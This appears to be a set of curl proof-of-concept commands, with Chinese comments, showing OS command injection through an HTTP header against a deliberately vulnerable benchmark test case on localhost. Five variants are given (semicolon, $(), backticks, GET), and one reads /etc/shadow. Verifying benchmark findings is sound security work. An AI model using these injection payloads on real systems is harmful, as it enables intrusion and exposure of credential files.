# 方式1：通过分号注入（最简PoC）
curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00606' \
  -H 'BenchmarkTest00606: hello; id'

# 方式2：通过子命令注入（shell注入）
curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00606' \
  -H 'BenchmarkTest00606: $(id)'

# 方式3：通过反引号注入
curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00606' \
  -H 'BenchmarkTest00606: `id`'

# 方式4：读取任意文件
curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00606' \
  -H 'BenchmarkTest00606: test; cat /etc/shadow'

# 方式5：GET方式同样受影响
curl 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00606' \
  -H 'BenchmarkTest00606: hello; whoami'